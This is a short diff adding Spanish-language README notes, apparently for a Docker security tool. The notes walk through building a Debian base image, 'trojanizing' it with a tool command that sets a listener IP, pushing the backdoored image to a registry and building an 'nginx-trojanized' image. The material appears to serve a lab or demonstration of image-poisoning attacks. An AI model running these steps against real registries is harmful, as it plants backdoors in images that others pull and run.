@@ -66,3 +66,27 @@ Y de modo interactivo (recordar que se ha cambiado el entry-point a bash. Lo que
 
 docker run --rm -it rawmind/alpine-traefik:1.1.2-1
 
+
+-= Creando la imágenes de docker =-
+
+Crear debian base:
+
+docker build -t localhost:5000/debian-base:latest .
+docker push localhost:5000/debian-base:latest
+docker save localhost:5000/debian-base:latest -o debian-base:latest
+
+Troyanizamos imagen:
+
+python __main__.py image modify trojanize debian-base/debian-base\:latest -l 192.168.43.196
+
+Cargamos imagen troyanizada:
+
+docker load -i debian-base\:latest
+
+Pusheamos la imagen:
+
+docker push localhost:5000/debian-base:latest
+
+Cargamos el nginx
+
+docker build -t nginx-trojanized .
